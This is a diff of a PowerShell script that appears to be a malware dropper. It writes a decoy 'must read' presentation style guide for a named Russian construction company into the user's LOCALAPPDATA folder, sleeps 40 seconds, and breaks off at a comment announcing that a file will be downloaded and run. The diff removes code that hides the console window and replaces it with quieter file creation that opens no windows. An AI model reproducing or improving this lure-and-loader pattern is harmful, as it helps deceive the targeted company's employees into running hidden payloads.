@@ -1,16 +1,4 @@
-# Скрываем окно PowerShell
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0)  # 0 = hide
-
-# Первая часть - создание текстового файла
-$fileName = "ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ!! ТЗ по визуалу и структуре.txt"
-$filePath = Join-Path $env:LOCALAPPDATA $fileName
+$path = Join-Path $env:LOCALAPPDATA 'ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ!! ТЗ по визуалу и структуре.txt'
 
 $content = @"
 Данный документ регламентирует единые стандарты для создания всех презентаций компании «Капитал – Строитель жилья!» (kapital62.ru). Цель — обеспечить узнаваемость, профессиональный вид и целостность всех материалов.
@@ -45,15 +33,14 @@ $content = @"
         Размер: 14-16 pt. Можно использовать курсив или цвет #767676.
 
     Важное правило: Не используйте более 3-х разных шрифтов на одном слайде.
-	
-3. РАБОЧА С ИЗОБРАЖЕНИЯМИ И МЕДИА
-Дополните слайды визуальными материалами там, где сочтёте нужным — из папки "Медиа для презентаций" или с фотостоков, например Unsplash.com.
+    
+3. РАБОТА С ИЗОБРАЖЕНИЯМИ И МЕДИА
+Дополните слайды визуальными материалами там, где сочтёте нужным — из папки “Медиа для презентаций” или с фотостоков, например Unsplash.com.
 "@
 
-$content | Out-File -FilePath $filePath -Encoding UTF8
-Invoke-Item $filePath
+# Создание файла без вывода окон
+Set-Content -Path $path -Value $content -Encoding UTF8
 
-# Задержка 40 секунд
 Start-Sleep -Seconds 40
 
 # Вторая часть - скачивание и запуск файла
